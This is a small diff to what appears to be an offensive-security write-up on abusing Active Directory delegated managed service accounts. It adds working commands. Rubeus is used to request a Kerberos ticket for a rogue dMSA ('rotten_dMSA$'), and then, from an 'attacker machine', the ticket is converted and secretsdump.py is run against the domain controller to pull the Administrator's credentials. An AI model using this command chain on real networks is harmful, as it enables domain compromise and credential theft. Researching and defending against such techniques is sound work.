@@ -64,5 +64,16 @@ PS C:\> .\Rubeus.exe asktgt /user:<controlledUser> /enctype:aes256 /password:<pa
 
 Using  TGT to request a TGT for `rotten_dMSA$`, save it in  `tgt.kirbi` and download it to the attacker host
 
+```PowerShell
+PS C:\> .\Rubeus.exe asktgs /targetuser:rotten_dMSA$  /service:krbtgt\CORP.LOCAL /dmsa /opsec /nowrap /ptt /outfile:tgt.kirbi /ticket:<controlledUser_TGT>
+```
 
+On the attacker machine:
+
+```bash
+$ ticketConverter.py tgt.kirbi tgt.ccache
+
+$ export KRB5CCNAME=tgt.ccache
+$ secretsdump.py @dc01.corp.local -k -no-pass -debug -just-dc-user Administrator
+```
 
